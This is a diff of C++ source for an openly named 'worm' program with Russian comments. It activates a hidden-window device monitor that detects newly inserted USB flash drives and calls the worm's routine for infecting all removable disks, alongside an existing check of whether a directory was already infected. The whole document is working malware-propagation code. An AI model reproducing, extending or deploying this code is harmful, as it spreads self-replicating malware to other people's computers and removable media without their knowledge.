@@ -408,35 +408,89 @@ bool worm::dir_was_infected(const wstring& dir_path)
     return fs::exists(full_name_to_file);
 }
 
-//LRESULT WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
-//{
-//    switch (msg) {
-//    case WM_DEVICECHANGE:
-//        if (wParam == DBT_DEVICEARRIVAL) {
-//            PDEV_BROADCAST_HDR hdr = (PDEV_BROADCAST_HDR)lParam;
-//            if (hdr && hdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
-//                PDEV_BROADCAST_VOLUME vol = (PDEV_BROADCAST_VOLUME)lParam;
-//                DWORD unitMask = vol->dbcv_unitmask;
-//
-//                for (int i = 0; i < 26; ++i) {
-//                    if (unitMask & (1 << i)) {
-//                        wchar_t drive = L'A' + i;
-//                        std::wcout << L"[💡] Обнаружена флешка: " << drive << L":\\" << std::endl;
-//                        process_all_removable_disks(); // вот тут вызывается worm
-//                    }
-//                }
-//            }
-//        }
-//        break;
-//    case WM_CLOSE:
-//        DestroyWindow(hwnd);
-//        break;
-//    case WM_DESTROY:
-//        PostQuitMessage(0);
-//        break;
-//    }
-//    return DefWindowProc(hwnd, msg, wParam, lParam);
-//}
 
+worm* worm::instance = nullptr;
 
+// WndProc, который вызывает process_all_removable_disks при подключении устройства
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    switch (msg) {
+    case WM_DEVICECHANGE:
+        if (wParam == DBT_DEVICEARRIVAL) {
+            PDEV_BROADCAST_HDR hdr = (PDEV_BROADCAST_HDR)lParam;
+            if (hdr && hdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
+                PDEV_BROADCAST_VOLUME vol = (PDEV_BROADCAST_VOLUME)lParam;
+                DWORD unitMask = vol->dbcv_unitmask;
 
+                for (int i = 0; i < 26; ++i) {
+                    if (unitMask & (1 << i)) {
+                        wchar_t drive = L'A' + i;
+                        std::wcout << L"[💡] Обнаружена флешка: " << drive << L":\\" << std::endl;
+
+                        // Вызов метода для обработки флешек
+                        if (worm::instance) {
+                            worm::instance->process_all_removable_disks();
+                        }
+                    }
+                }
+            }
+        }
+        break;
+    case WM_CLOSE:
+        DestroyWindow(hwnd);
+        break;
+    case WM_DESTROY:
+        PostQuitMessage(0);
+        break;
+    }
+    return DefWindowProc(hwnd, msg, wParam, lParam);
+}
+
+int worm::run_device_monitor(HINSTANCE hInstance)
+{
+    const wchar_t CLASS_NAME[] = L"WormDeviceMonitorWindow";
+
+    WNDCLASS wc = {};
+    wc.lpfnWndProc = WndProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = CLASS_NAME;
+
+    if (!RegisterClass(&wc)) {
+        std::wcerr << L"Ошибка регистрации класса окна\n";
+        return -1;
+    }
+
+    HWND hwnd = CreateWindowEx(
+        0,                              // расширенный стиль окна
+        CLASS_NAME,                     // имя класса
+        L"Worm Device Monitor",         // заголовок окна
+        WS_OVERLAPPEDWINDOW ,            // стиль окна
+        CW_USEDEFAULT, CW_USEDEFAULT,   // позиция окна
+        300, 200,                      // размер окна
+        NULL, NULL, hInstance, NULL);
+
+    if (!hwnd) {
+        std::wcerr << L"Ошибка создания окна\n";
+        return -1;
+    }
+
+    ShowWindow(hwnd, SW_HIDE); // Скрываем окно
+
+    // Цикл сообщений
+    MSG msg = {};
+    while (GetMessage(&msg, NULL, 0, 0) > 0) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    return 0;
+}
+
+void attach_console() {
+    AllocConsole();
+    FILE* fp;
+    freopen_s(&fp, "CONOUT$", "w", stdout);
+    freopen_s(&fp, "CONOUT$", "w", stderr);
+    freopen_s(&fp, "CONIN$", "r", stdin);
+    std::ios::sync_with_stdio();
+}
